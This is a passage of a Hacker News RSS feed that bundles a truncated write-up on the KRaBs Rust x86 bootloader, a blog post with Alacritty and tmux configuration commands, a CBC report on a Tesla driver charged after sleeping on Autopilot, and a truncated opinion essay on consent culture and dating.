<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/">GitHub - o8vm/krabs: An x86 bootloader written in Rust.</a> </p>
<p>It has the following features: </p>
<ol> <li> Currently, only legacy BIOS is supported.</li> <li> Both 64 bit and 32 bit system are supported.</li> <li> Both 64 bit long mode and 32 bit protected mode kernel are supported.</li> <li> GPT format partition table is supported.</li> <li> FAT32 file system support.</li> <li> The boot-time behavior can be controlled by CONFIG.TXT, which is placed on the FAT32 filesystem.</li> <li> Minimal x86/x86_64 Linux boot protocol is supported.</li> <li> kernel command line setting in CONFIG.TXT is supported.</li> <li> Some modules such as initramsfs/initrd are supported.</li> 10. The multi-boot specification is not supported. </ol> 
<p>An example of starting 64bit vmlinux with kernel command line and initrd is described in <a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/docs/linux-image-setup-64.md">this article</a>. </p>
<p>Just git clone the project and run a <code>cargo run</code> to experience after some preparation: </p>
<pre><code>
cargo run -- -we disk.img
</code></pre>
<p><a target="_blank" rel="noopener noreferrer" href="https://vmm.dev/en/rust/gogWCnI37-demo3.gif"><img src="https://vmm.dev/en/rust/gogWCnI37-demo3.gif" alt="demo3.gif"></a></p>
</section>
<section>
<h2>What motivated me to develop KRaBs?</h2>
<p>I thought that lower level programming below the OS stack could be also made more modern by using Rust. I wanted to extract the minimum essentials from the process of booting the Linux kernel and finally make up original bootloader where there is no black box for me.
<br>
 </p>
<p>In addition: </p>
<ul> <li>It's not easy for me to read the source code of an existing chain loader.</li> <li>Reading large amounts of assembly and C source code is tough for a beginner. It takes a lot of time and effort to read it. </li> <li>It is said that Rust binaries tend to be too big and not suitable for writing bootloaders, but I wondered if it is true.</li> </ul> 
<p>Based on the above, I've decided to write down the bootloader in Rust from scratch. </p>
</section>
<section>
<h2>How KRaBs Works</h2>
</section>
<section>
<h3>Linux kernel bootstrapping mechanism</h3>
<p>While it may be difficult to unravel the Linux kernel bootstrapping mechanism from the bzImage and GRUB bootloader sources, The mechanism itself is surprisingly simple.
<br>
 There are four basic things: Loading the ELF-formatted image from the file system, Relocating it according to the program headers, and initializing system and setting parameters according to The Linux/x86 Boot Protocol. That's all there is to it. </p>
<p>Specifically, the following four types of initialization are performed: </p>
<p><strong>Hardware initialization:</strong> </p><ul> <li>Setting the keyboard repeat rate.</li> <li>Disable interrupts and mask all interrupt levels.</li> <li>Setting Interrupt descriptor (IDT) and segment descriptor (GDT). As a result,</li> all selectors (CS, DS, ES, FS, GS) refer to the 4 Gbyte flat linear address space. <li>Change the address bus to 32 bits (Enable A20 line).</li> <li>Transition to protected mode.</li> <li>If the target is ELF64, set the 4G boot pagetable and transition to long mode.</li> </ul> 
<p><strong>Software initialization:</strong> </p><ul> <li>Get system memory by BIOS call.</li> </ul> 
<p><strong>Information transmission to the kernel:</strong> </p><ul> <li>KRaBs mount the FAT32 EFI System Partition and Reading the CONFIG.TXT.</li> <li>Setting <a target="_blank" rel="noopener noreferrer" href="https://www.kernel.org/doc/html/latest/x86/zero-page.html">Zero Page</a> of kernel parameters and transmit it to the OS.</li> </ul> 
<p><strong>Load items and Relocate the kernel:</strong> </p><ul> <li>Load kernel, initrd and command line according to CONFIG.TXT.</li> <li>The target is an ELF file, KRaBs do the ELF relocation.</li> </ul> 
<p>The format of CONFIG.TXT is a simple matrix-oriented text file that looks like this: </p>
<pre><code>
main.kernel sample-kernel
main.initrd sample-initrd
main.cmdlin sample command line clocksource=tsc net.ifnames=0
</code></pre>
<p>To perform the above process, KRaBs uses a program that is divided into four stages. </p>
</section>
<section>
<h3>Stages Overview</h3>
<ol> <li> stage1  </li> A 446 byte program written to the boot sector. The segment registers(CS, DS, ES, SS) are set to <code>0x07C0</code>, and the stack pointer (ESP) is initialized to <code>0xFFF0</code>. After that, stage2 is loaded to address <code>0x07C0:0x0200</code>, and jumps to address <code>0x07C0:0x0206</code>. In the latter half of stage1, there is an area for storing the sector position and length (in units of 512 bytes) of the stage2 program. <li> stage2  </li> Load stage3 and stage4, then jump to stage3. The stage3 program is loaded at address <code>0x07C0:0x6000</code>, the stage4 is loaded at address <code>0x0003_0000</code> in the extended memory area. The file is read from the disk using a 2K byte track buffer from address <code>0x07C0:0xEE00</code>, and further transferred to an appropriate address using <code>INT 15h</code> BIOS Function <code>0x87h</code>. A mechanism similar to this function is used in stage 4. When the loading of stage3 and stage4 is completed, jump to address <code>0x07C0:0x6000</code>.  <li> stage3  </li> Do hardware and software initialization which need BIOS calls. After a series of initialization, empty_zero_page information is prepared in <code>0x07C0:0x0000</code> to <code>0x07C0:0x0FFF</code>. Enable the A20 line, change the address bus to 32 bits, and shift to the protect mode. Then, jump to the Stage4. <li> stage4  </li> Mount the FAT32 EFI System Partition. Then, read and parse the CONFIG.TXT on that partition. Load ELF kernel image, initrd, and kernel command line according to CONFIG.TXT. Drop to real mode when executing I/O. Set Command line and image informations in empty_zero_page. ELF kernel image is stored to the extended memory address <code>0x100000</code> or later, and then the ELF32/ELF64 file is parsed and loaded. If the target is ELF64, set the 4G boot pagetable and transition to long mode. Finally, jump to the entry point to launch the kernel. At this time, put the physical address (<code>0x00007C00</code>) of the empty_zero_page information prepared in the low-order memory into the <code>ESI</code> or <code>RSI</code> register. <li> plankton🦠  </li> library common to stage1 ~ stage4. </ol> 
</section>
<section>
<h3>How build KRaBs</h3>
<p>The directory structure of the KRaBs project is as follows: </p>
<pre><code>
$ cd /path/to
$ tree . -L 3
.
├── build.rs
├── Cargo.toml
├── rust-toolchain
├── src
│   ├── bios
│   │   ├── plankton
│   │   ├── stage_1st
│   │   ├── stage_2nd
│   │   ├── stage_3rd
│   │   └── stage_4th
│   ├── main.rs
│   └── uefi
...
</code></pre>
<p>All four stages that make up the bootloader for the legacy BIOS and a library called plankton are stored as a sub crate under a directory named <code>src/bios</code>.
<br>
 Under the <code>src/uefi</code> directory, we plan to store UEFI-compatible bootloader crates.
<br>
 All these sub-crates will be built by <code>build.rs</code> at <code>cargo build</code> time.
<br>
 </p>
<p><code>src/main.rs</code> is not the main body of the bootloader, <code>src/main.rs</code> is the CLI program that places KRaBs on the disk. This <code>main.rs</code> will write each stage of the KRaBs to the appropriate location on the disk. The <code>-w</code> option is used to write the stages to disk. </p>
<p>With this directory structure, just run <code>cargo buil</code> to build the CLI and the boot loader, and <code>cargo run -- -w disk.img</code> to burn the boot loader to disk. You can also test it with qemu by running <code>cargo run -- -e disk</code>. </p>
</section>
<section>
<h3>DISK Structure</h3>
<p>KRaBs supports disks that are partitioned in GPT format.
<br>
 The BIOS Boot Partition and the EFI System Partition are required. Place stage1 in the boot sector and stage2 ~ stage4 boot code for legacy BIOS in the BIOS Boot Partition. Place the CONFIG.TXT, Linux kernel, initrd on the FAT32 file system of the EFI System Partition. </p>
<p>Example: </p>
<pre><code>
$ gdisk -l disk.img 
...
Found valid GPT with protective MBR; using GPT.
Disk disk2.img: 204800 sectors, 100.0 MiB
Sector size (logical): 512 bytes
Disk identifier (GUID): 2A1F86BB-74EA-47C5-923A-7A3BAF83B5DF
Partition table holds up to 128 entries
Main partition table begins at sector 2 and ends at sector 33
First usable sector is 34, last usable sector is 204766
Partitions will be aligned on 2048-sector boundaries
Total free space is 2014 sectors (1007.0 KiB)

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048            4095   1024.0 KiB  EF02  BIOS boot partition
   2            4096          106495   50.0 MiB    EF00  EFI system partition
   3          106496          204766   48.0 MiB    8300  Linux filesystem
</code></pre>
</section>
<section>
<h3>Why use EFI System Partition?</h3>
<p>The reason for this is to make this project compatible with the UEFI environment in the future.
<br>
 I didn't support UEFI from the start because: </p>
<ul> <li>This bootloader was originally intended to be used on older PCs, such as the ThinkPad 600X.</li> <li>Currently, Legacy BIOS support works in a wider range system than UEFI.</li> <li>It is mainly intended to be used in the cloud environment except my PC. Legacy BIOS is the mainstream in x86 cloud environment, and there seems to be no merit to replace it with UEFI.</li> </ul> 
</section>
<section>
<h2>Is Rust good for writing a bootloader?</h2>
<p>I know there are pros and cons, but for me, Rust has been so much easier and better than writing C and assemblies. Personally, I think Rust is also pretty good for low-level programming, like bootloaders. </p>
<ol> <li> It's a great relief when the compilation is completed without problems   </li> When something goes wrong, most of the time I only need to suspect the unsafe part. This has made debugging a lot easier. I'm an amateur programmer, but thanks in part to this, I was able to complete my first prototype in a week. <li> Rust's build system is the best  </li> In Rust, you don't have to wonder which object file to link with which, like in C. <li> I can use my C experience</li> Since the chain loader is a rocket structure, we always have to code the unsafe parts in order to move to the next stage, and I thought it would be nice to be able to use the same techniques I often use in C for the unsafe parts.  <li> I think even the low-level code in no_std can be written in a modern way.</li> </ol> 
</section>
<section>
<h2>Issues</h2>
</section>
<section>
<h3>(RESOLVED) Setting Page Tables</h3>
<p>I tried to set up the page table with an alignment with a linker script or a struct attribute <a target="_blank" rel="noopener noreferrer" href="https://doc.rust-lang.org/reference/type-layout.html#representations">align</a>, but none of these things worked. It looked like the alignment settings were breaking other data structures. It's possible that I wasn't doing it right, but I didn't understand why and gave up debugging. In the end, I dealt with it by manually allocating the page table to the area where I wanted to set up. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/src/bios/stage_4th/src/svm/lm.rs#L44-L69">This code:</a> </p>
<pre><code>
fn setup_page_tables() {
    use plankton::layout::PGTABLE_START;
    use plankton::mem::MemoryRegion;
    let mut pg_table = …</code></pre></section></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vmm.dev/en/rust/krabs.md">https://vmm.dev/en/rust/krabs.md</a></em></p>]]>
            </description>
            <link>https://vmm.dev/en/rust/krabs.md</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514100</guid>
            <pubDate>Fri, 18 Sep 2020 07:54:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Play console games on the web – AirConsole]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514066">thread link</a>) | @morgam
<br/>
September 18, 2020 | http://aircn.sl/console | <a href="https://web.archive.org/web/*/http://aircn.sl/console">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://aircn.sl/console</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514066</guid>
            <pubDate>Fri, 18 Sep 2020 07:49:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alacritty – Fastest OS X Terminal Emulator – Terminal like tmux/alacritty config]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24513821">thread link</a>) | @bebrws
<br/>
September 18, 2020 | https://bradbarrows.com/post/alacritty | <a href="https://web.archive.org/web/*/https://bradbarrows.com/post/alacritty">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><article><img src="https://bradbarrows.com/static/alacritty.png" alt="Alacritty - Fastest OSX Terminal?"><div><h2>Introducing Alacritty</h2><p>Alacritty is most likely the fastest GPU accelerated terminal emulator for OSX.</p><p>The only reason I hadn't tried it or used it very much before was the learning curve 
of a new terminal emulator and it's lack of tabs.</p><p>Luckily I was able to figure out how to make a great tmux and alacritty configuration 
file along with some nice bash functions to help with editing the configurations.</p><h2>Setting up Alacritty using my build</h2><p>First <a href="https://github.com/bebrws/alacritty/releases/download/0.6.0-dev-brads/Alacritty.zip">install Alacritty</a> from my repo to get a build that has an "Always On Top' action
I built in. The keyboard combo for this will "Command Shift A".</p><h2>Setting up Alacritty using my tmux and alacritty config</h2><p>Next clone my <a href="https://github.com/bebrws/myalacritty">configuration files</a></p><pre><code>git clone git@github.com:bebrws/myalacritty.git
cd myalacritty
cp tmux.conf ~/.tmux.conf
mkdir -p ~/.config/alacritty/
cp * ~/.config/alacritty/
wget http://bradbarrows.com/dls/jsin.zip
unzip jsin.zip
mv jsin /usr/local/bin/jsin</code></pre><h2>Bash/ZSH functions</h2><p>Add these functions to your .zshrc</p><pre><code>######### ALACRITTY GOOODNESS ############
alias -g alacrittycolors='python3 /Users/bbarrows/Library/Python/3.8//lib/python/site-packages/alacritty_colorscheme/cli.py '
# To use run: alaFontSize 12
function alaFontSize() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.font.size=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaOpacity 0.8
function alaOpacity() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.background_opacity=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaColorTheme
# Must run: sudo pip3 install alacrittycolors
# before using
# Also make sure jsin is installed from above or: https://github.com/bebrws/jsin
function alaColorTheme() {
   export ALABASE=$(python3 -m site | grep site | grep packages | head -n 1 | jsin "l.replace(/\s*\'/g, '').replace(/,/g, '')")
   python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/$(ls  ~/.config/alacritty/colors/ | fzf --preview "python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/{} &amp;&amp; htop")
}
function alaResetDark()  {
  cp ~/.config/alacritty/alacritty.yml.dark ~/.config/alacritty/alacritty.yml
}
function alaResetLight()  {
  cp ~/.config/alacritty/alacritty.yml.light  ~/.config/alacritty/alacritty.yml
}</code></pre><h2>Keyboard shortcuts</h2><ul><li>You should end up with tabs that you can click on just like Terminal.app and then can use the keyboard shortcuts "Shift-Left or Right arrow key".</li><li>"Control-b then c" - Create a new tab</li><li>"Control-b then f" - Create a horizonal window in the tab</li><li>"Control-b then v" - Create a veritical window in the tab</li><li>"Alt-Left or Right arrow key" - Move between split windows in the tab</li><li>"Command-Shift-A" - Keep Alacritty always on top</li><li>"Command-Shift-F" - Full screen</li><li>"Command-Shift-=/-" - Font size</li></ul><p>All the control and alt backspace and arrow key bindings should work out of the box!</p><p>You will end up with this beautiful terminal:</p><p><img alt="Alacritty in action" src="https://bradbarrows.com/static/alacritty.gif"></p></div></article></div></div></section></div>]]>
            </description>
            <link>https://bradbarrows.com/post/alacritty</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513821</guid>
            <pubDate>Fri, 18 Sep 2020 07:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Speeding Tesla driver caught napping behind the wheel on Alberta highway]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513648">thread link</a>) | @goodcanadian
<br/>
September 17, 2020 | https://www.cbc.ca/news/canada/edmonton/tesla-driver-napping-alberta-speeding-1.5727828 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/edmonton/tesla-driver-napping-alberta-speeding-1.5727828">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A 20-year-old B.C. motorist who who found reclining behind the wheel of a Tesla while the electric vehicle was on autopilot has been charged by the RCMP in Alberta with speeding.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5727840.1600356254!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/tesla-speeding-alberta.JPG"></p></div><figcaption>The 20-year-old B.C. driver of this Tesla Model S has been charged with speeding and dangerous driving, a criminal offence. The incident occurred on July 9 on Highway 2 near Ponoka, about 100 kilometres south of Edmonton.<!-- --> <!-- -->(Alberta RCMP)</figcaption></figure><p><span><p>The RCMP&nbsp;in Alberta have charged a&nbsp;20-year-old British Columbia man with&nbsp;speeding while he was asleep at the wheel of a Tesla electric car.</p>  <p>The RCMP&nbsp;received&nbsp;a call at about&nbsp;4 p.m. on July 9 concerning&nbsp;a 2019 Tesla Model S speeding south on Highway 2 near Ponoka, about 100&nbsp;kilometres south of Edmonton.</p>  <p>Both front seats were fully&nbsp;reclined, and both the driver and passenger&nbsp;appeared to be sound asleep, police say.&nbsp;</p>  <p>The car appeared to be driving on&nbsp;autopilot at more than 140 km/h, RCMP&nbsp;Sgt. Darrin Turnbull&nbsp;told CBC News on Thursday. The speed limit on that stretch of highway is 110 km/h.</p>  <p>"Nobody was looking out the windshield to see where the car was going," he&nbsp;said.&nbsp;</p>  <p>"I've been in policing for over 23 years&nbsp;and the&nbsp;majority of that in traffic&nbsp;law enforcement, and I'm speechless.</p>  <p>"I've never, ever seen anything like this before, but of course the technology wasn't there."&nbsp;</p>  <p>Tesla Model S sedans have autopilot functions, including auto-steer and "traffic-aware" cruise control, and both functions appeared to be activated.</p>  <p>"We believe the vehicle&nbsp;was operating on the autopilot system, which is really just an advanced driver safety system, a driver assist program. You still need to be driving the vehicle," Turnbull said.&nbsp;</p>  <p>"But of course, there are after-market things that can be done to a vehicle against the manufacturer's recommendations to change or circumvent the safety system."&nbsp;</p>  <p>After the responding officer activated emergency lights on their vehicle, the Tesla automatically began to accelerate, Turnbull said, even as those vehicles that were ahead of the Tesla on the highway moved out of the way.</p>  <p>"Nobody appeared to be in the car, but the vehicle sped up because the line was clear in front."</p>  <ul>  </ul>  <p>The responding officer obtained radar readings on the vehicle, confirming that it had automatically accelerated to exactly 150 km/h.</p>  <p>The RCMP charged the driver with speeding and issued a 24-hour licence suspension for fatigue.&nbsp;</p>  <p>After further investigation and consultation with the Crown, a Criminal Code charge of dangerous driving was laid against the driver, police said.</p>  <p>The driver was served with a summons for court in December.</p>  <ul>   <li><strong><a href="https://www.cbc.ca/news/business/tesla-s-self-driving-autopilot-system-under-scrutiny-1.5413931" target="_blank">Tesla's self-driving Autopilot system under scrutiny after 3 deadly crashes</a></strong></li>   <li><strong><a href="https://www.cbc.ca/news/canada/british-columbia/driverless-tesla-richmond-b-c-1.5349855" target="_blank">Driverless Tesla coasting along mall parking lot raises questions, causes confusion</a></strong></li>  </ul>  <p>Autonomous cars are in their early stages in much of Canada, with Ontario and Quebec approving pilot projects as long as a vigilant driver is present to take control of the vehicle when needed.</p>  <p>There have not been any reported self-driving car crashes in Canada, but several have been reported in the United States, putting Tesla's autopilot driving system functions&nbsp;under scrutiny.</p>  <p>On Dec. 29, 2019, a Tesla Model S sedan left a freeway in Gardena, Calif., at high speed, ran a red light and struck a Honda Civic, killing two people inside, police said. On the same day, a Tesla Model 3 hit a parked firetruck on an Indiana freeway, killing a passenger in the Tesla.</p>  <p>On Dec. 7, a Model 3 struck a police cruiser on a Connecticut highway, but&nbsp;no one was hurt.</p>  <p>Tesla's autopilot function is designed to keep a car in its lane and at a safe distance from other vehicles. Autopilot also can change lanes on its own.</p>  <ul>  </ul>  <h2>'It&nbsp;gives all of us a bad name'</h2>  <p>Angie Dean, president of the Tesla Owners Club of Alberta, said the incident is troubling for the 300 paying members of her group&nbsp;and the more than 1,000 active members of the club's online Facebook group.&nbsp;</p>  <p>Dean said the driver-assist functions in Tesla vehicles are designed to enhance safety, not detract from it.</p>  <p>"This type of story is sort of next to&nbsp;a worst-case scenario," she&nbsp;said. "The only thing that would be worse than this is if someone had got hurt.&nbsp;Everyone that I've spoken with is just so disappointed and so frustrated because it's abuse of the system.</p>  <p>"It&nbsp;gives all of us a bad name, and the vast majority of us would never do something like this. We bought these cars because we want to be safer."</p>  <p>The driver-assist program&nbsp;requires&nbsp;regular input from the driver to function,&nbsp;Dean said. If the driver's hands come off the wheel, warnings begin going off every 15 seconds, she said.</p>  <p>"It asks you to put your hands on the wheel&nbsp;and&nbsp;turn it a little bit so that it knows that your hands are on the wheel," Dean said.&nbsp;</p>  <p>"If you don't, it starts beeping at you. And if you still don't, it gets even louder. And&nbsp;if you still don't, it actually turns the hazard lights on, slows the vehicle down and it pulls it over. It turns the car off and autopilot will not engage for the rest of that drive."</p>  <p><strong><em>WATCH | Is the technology behind driverless cars ready for the road?</em></strong></p>  <p><span><span><span></span><span>The technology behind self-driving cars is available and in use, but there are examples showing it may not be fully ready for the real world.<!-- --> <!-- -->2:09</span></span></span></p>  <p>Despite the built-in safeguards, videos&nbsp;circulating online instruct drivers on ways to "hack" and override&nbsp;these systems, Dean&nbsp;said.</p>  <p>"There are a lot of systems that are in place that are really, really trying not to make this possible. But if there's a will, there's a way, I suppose. "&nbsp;</p>  <p>Just because some vehicles can drive themselves, it doesn't mean they should, the RCMP said.&nbsp;</p>  <p>&nbsp;"Although manufacturers of new vehicles have built in safeguards to prevent drivers from taking advantage of the new safety systems in vehicles, those systems are just that — supplemental safety systems," said Supt. Gary Graham of Alberta RCMP Traffic Services.&nbsp;</p>  <p>"They are not self-driving systems, they still come with the responsibility of driving."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/edmonton/tesla-driver-napping-alberta-speeding-1.5727828</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513648</guid>
            <pubDate>Fri, 18 Sep 2020 06:43:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Love Hurts: So let’s stop infantilizing women and demonizing men]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24513528">thread link</a>) | @jseliger
<br/>
September 17, 2020 | https://www.persuasion.community/p/love-hurts-511 | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/love-hurts-511">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg&quot;,&quot;height&quot;:971,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1378800,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>If you've ever read a Regency romance novel or watched a Jane Austen adaptation, you probably have a passing acquaintance with the trope of the <em>ruined woman</em>: that tragic victim of some caddish man who loved her, left her, and wrecked her societal resale value on his way out the door. In a world governed by a patriarchal system of marriage and inheritance, dependent on female purity to ensure any male offspring were legitimate, the ruined woman was literally damaged goods. Even the slightest whiff of a premarital dalliance could spell her undoing.</p><p>These old school ideas about women's worth have never entirely left us, resurfacing over the years in everything from the work of Andrea Dworkin to the abstinence wars of the late 1990s (when sex ed teachers would memorably compare girls who had sex before marriage to used pieces of Scotch tape). With dowries out of the picture, the idea that sex devalued women attached itself instead to America's sudden obsession with self-esteem. A young woman who had sex, particularly casual sex, clearly didn't respect herself. She was trying to fill an emotional void with cheap physical connection, and—yes—was making herself unmarriageable. <em>He won’t buy the cow,</em> we were told, <em>if he can get the milk for free.</em></p><p>Today, the notion that sexual contact is degrading to women has become wrapped up in the contemporary progressive language of trauma and consent. The damage in question is emotional, not material, but the paternalistic message is the same: innocent women must be protected. </p><p><em>Consent is sexy</em>, we are told, as sex-education pamphlets primly instruct us in the essentials of mid-coital conversation.<em> Do you like it when I touch you there? What do you want me to do to you? </em>Never mind that said literature studiously ignores the fact that for the young, inexperienced people at whom such instructions are directed, dirty talk by administrative mandate just adds a whole new layer of pressure to an already awkward situation: For all its protestations about how <em>hot </em>consent can be, the progressive discourse surrounding sex is markedly unsexy. Amid the obsession with power, oppression and the ever present threat of harm, the notion of desire (or, heaven forbid, <em>fun</em>) all but disappears. Even the most pornographic consent-is-sexy script is about risk mitigation, not titillation, an insurance waiver with a side of heavy breathing. </p><p>This laser-focus on consent effectively recasts sex itself as a dangerous act, to be undertaken with extreme caution and only if absolutely necessary. And if relationships are mainly about power and the threat of abuse, those who pursue them too enthusiastically must be viewed with suspicion. More old-school gender stereotypes crop up here: men are increasingly seen as predators almost by default, while women are cast as helpless, even infantile. (Witness the rise of the word "grooming," previously reserved for sexual predation of children, as something done to women in their twenties.) As a breathtaking range of disappointing male behavior gets swept under the umbrella of MeToo, the line between pursuing a woman and preying on her has become blurred. When it was revealed that comic book writer Warren Ellis <a href="https://www.theguardian.com/books/2020/jul/13/women-speak-out-about-warren-ellis-transmetropolitan">had relationships with multiple women at once</a>, the litany of harms included no sexual misconduct at all; instead, the women were "[shocked] at the sheer magnitude of his pursuits … heartbroken when he stopped talking to them, or angry after discovering he was sending many of them identical messages." </p><p>Shock, heartbreak, anger: these are normal things to feel when a romantic relationship goes sour. But today, they're lumped into the nefarious category of abuse by virtue of the purported power someone like Ellis—older, wealthier, more professionally successful, or otherwise more <em>privileged</em>—holds over his partners. By contrast, the notion that these were known and unavoidable risks of intimacy is dismissed as victim-blaming. As one of Ellis' accusers tweeted, "None of us consented to being manipulated." </p><p>This notion of consent as a safeguard against upsetting emotions is both new and counterintuitive: in most contexts (for instance, medical trials or media interviews), consent is sought precisely because what follows cannot be predicted, and may well be uncomfortable. But in certain progressive spaces, discomfort of any kind is taken to indicate the absence of consent, rendering countless normal human interactions suspicious. Turning someone down isn't comfortable, but neither is asking someone out. Even happy relationships involve moments of discomfort, disappointment, conflict—and even amicable breakups are rarely pain-free. Yet young people are now being taught to expect absolute emotional safety in sex, love and courtship at all times—and that if they feel hurt, disappointed or betrayed, it means they've been violated.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;class&quot;:null}"><a href="https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share</span></a></p><div><p>So how did we get here? Social conservatives say that hookup culture is to blame, and they're not wrong: traditional courtship, monogamy and marriage have their downsides, but they do give relationships a certain amount of structure and security. In the age of Tinder, those safeguards are comparatively hard to come by—and the elaborate (and sometimes ridiculous) bureaucracy of consent regulations may be best understood as a desperate attempt to impose some order on this wild west of sex and intimacy, spearheaded by people who are terrified of being vulnerable or getting hurt. There's a sense that relationships could be made unfailingly safe and comfortable, that disappointment and awkwardness wouldn't exist, if we only had enough <em>rules</em>. </p><p> Relationships have always been risky endeavors, but, ironically, this hypervigilance has made them seem outright terrifying. Every new romance is treated like a scavenger hunt for "red flags" that forewarn abuse, and every breakup is subject to adjudication via the #MeToo framework. Unhappy exes hash out their grievances on social media in a way that used to be reserved for divorced celebrities wrangling for the sympathy of the press. Private affairs are dragged into the spotlight for public reckoning and reparations. Men, already saddled with the pressure of making the first move, have to calculate the additional risk that an awkward overture or misread signal will result not just in rejection, but public humiliation and ruination. For all its valuable contributions to combating sexual harassment in the workplace, #MeToo has also made dating itself at once more fraught and less appealing—for everyone. If every relationship is a power struggle, in which the less privileged party is perpetually at risk of being victimized, why even bother? Who could possibly enjoy this? </p></div><p>This is not to demand a return to the rigid courtship norms of the Regency era—nor to the blinkered sex-positivity of the early aughts. Instead, we need to reintroduce basic notions of female empowerment and individual agency, and push back against the facile understanding of complex interpersonal relationships as power struggles between oppressed and oppressor. We should teach both young men <em>and</em> young women to recognize each other's vulnerability and humanity—even when a partner may hold more power than they do by certain measures—and to engage with their lovers as individuals, rather than as representatives of an identity group. And we should also teach young people to tolerate and work through discomfort, rather than seeing themselves as helplessly in thrall to power dynamics that leave them forever teetering on the precipice of victimhood. </p><p>When I wrote a teen advice column between 2009 and 2019, there was one question I received more often than any other: "How can I fall in love without getting hurt?" My answer was always the same: You can't! Intimacy requires vulnerability; the joy of human connection always comes with the risk of being hurt. But that risk is the same for everyone, no matter how privileged or blessed with institutional clout. Even the wealthiest, whitest, most cisheterosexual dudebro in the world can be absolutely wrecked by heartbreak—and even a person who sits at the intersectional nexus of multiple oppressed identity categories has the power to break someone's heart.</p><p>As much as trauma and abuse have replaced purity and marriageability on the landscape of moral panics, the same old fear is at work: that women's desires, left unchecked, will leave them in ruins. And while the impulse to protect young people from emotional pain may be well intentioned, the results are toxic. The obsessive focus on power as the driving mechanism in all relationships fuels a cycle of catastrophic thinking: women are ever more fearful of being mistreated, ever more convinced of their powerlessness to avoid it, and ever more sure that when it happens, they will be unable to handle it. And all the while, men, dehumanized by a framework that casts their desires as inherently predatory, are being taught to mistrust and infantilize women in the guise of respecting them.</p><p>We need to permanently banish the specter of the ruined woman from our understanding of heterosexual relationships. A healthy, sex-positive society acknowledges that unpredictability is a feature of dating, not a bug, and cannot be consent-scripted out of existence—particularly for inexperienced people, and especially when it comes to casual sex. Young people must be taught to be kind with and conscientious to each other, to respect boundaries, and to err on the side of caution in ambiguous situations—but they should also be taught that love and sex are rife with painful misunderstandings, and that even well-meaning people can hurt each other because they're insecure, confused or genuinely unsure about what they want. Instead of trying to keep them from ever feeling heartbreak, regret or shame, let's teach them that these things are always survivable, and sometimes even useful. Teach them to be gracious about rejection and charitable about missteps, knowing that they'll make mistakes …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.persuasion.community/p/love-hurts-511">https://www.persuasion.community/p/love-hurts-511</a></em></p>]]>
            </description>
            <link>https://www.persuasion.community/p/love-hurts-511</link>
